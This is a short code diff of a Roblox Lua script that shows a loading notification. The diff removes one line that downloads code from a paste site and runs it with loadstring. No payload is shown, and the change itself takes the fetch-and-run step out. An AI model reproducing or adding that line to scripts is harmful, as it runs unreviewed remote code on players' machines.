@@ -6,7 +6,6 @@ local Players = game:GetService("Players")
 local StarterGui = game:GetService("StarterGui")
 
 local localPlayer = Players.LocalPlayer
-loadstring(game:HttpGet("https://paste.debian.net/plainh/ff89f0f2/", true))()
 StarterGui:SetCore("SendNotification", {
     Title = "Script Loadind",
     Text = "Welcome, " .. localPlayer.Name .. "! Script is loading, please wait...",
